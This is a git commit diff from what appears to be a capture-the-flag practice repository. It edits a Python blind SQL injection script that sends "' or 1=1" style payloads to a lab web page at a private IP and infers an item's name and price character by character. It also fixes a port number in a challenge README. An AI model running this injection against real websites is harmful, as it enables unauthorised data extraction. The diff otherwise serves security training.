dc50952d50f7a085bc88bd9d026a61f05d845fbc
root <tanhengyeow@gmail.com>
2017-09-09 11:25:31 +0800

    Refined some stuff

--- blind-sqli/blind.py
+++ blind-sqli/blind.py
@@ -4,7 +4,7 @@ import requests
 import string 
 
 perm = string.ascii_uppercase + string.digits
-url = "http://<url>:3004/trueorfalse.php"
+url = "http://192.168.162.139:3004/trueorfalse.php"
 itemname = ""
 price = ""
 counter = 99
@@ -14,6 +14,7 @@ while True:
 	injectQuery = '\' or 1=1 and price = ' + str(counter) + '#'
 	payload = {'search': injectQuery}
 	html = requests.post(url, data=payload)
+	print("Current counter: %s" % str(counter))
 	if "This item exists" in html.content:
 		while True:
 			for i in perm:	
@@ -30,3 +31,8 @@ while True:
 						print("Name of item: %s" % itemname)
 						print ("Price of item: %s" % counter)
 						exit()
+
+
+
+
+
--- bruteforce/README.md
+++ bruteforce/README.md
@@ -1,3 +1,3 @@
 # Challenge 3
 
-"Inserts favorite game" has released a challenge for all the players! If you can create a character with the "Ideal name" and "Ideal stats", you'll receive a prize. URL:3003
+"Inserts favorite game" has released a challenge for all the players! If you can create a character with the "Ideal name" and "Ideal stats", you'll receive a prize. URL:3002
